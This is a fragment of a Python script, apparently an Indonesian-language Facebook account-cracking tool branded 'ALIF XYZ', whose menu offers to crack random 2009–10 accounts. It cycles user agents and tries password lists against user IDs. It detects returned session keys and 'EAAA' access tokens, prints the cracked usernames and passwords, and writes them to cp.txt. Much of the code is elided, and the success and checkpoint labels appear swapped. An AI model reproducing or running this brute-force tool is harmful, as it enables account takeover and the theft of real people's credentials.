...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print('\033[93;1mHello Selamat Datang Di Scriptnya ALIF \033[0m')
		print('\033[1;92mJangan Lupa Gabung Di Group FUI \033[0m')
		print("")
		print("%s[%s1%s]%s CRACK RANDOM FB TAHUN 2009-10 %s[New]"%(G,G,R,Y,B))
	...
	def api(self, uid, pwx):
		ua = random.choice([
			...
			"NokiaC3-00/5.0 (07.20) Profil/MIDP-2.1 Konfigurasi/CLDC-1.1]"
            "Mozilla/5.0 AppleWebKit/420+ (KHTML,Gecko) Safari/420+]"
		])
		sys.stdout.write(
			"\r\r%s [ALIF XYZ] %s/%s ➤ \033[0;97m CP👉%s \033[0;97m OK👉%s "%(W,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r\033[0;93m[ALIF XYZ-CP]USERNAME :%sSANDI :%s\033[0;93m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * ➤ %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r\033[92;1m[ALIF XYZ-OK]USERNAME :%sSANDI :%s\033[92;1m         "%(uid, pw))
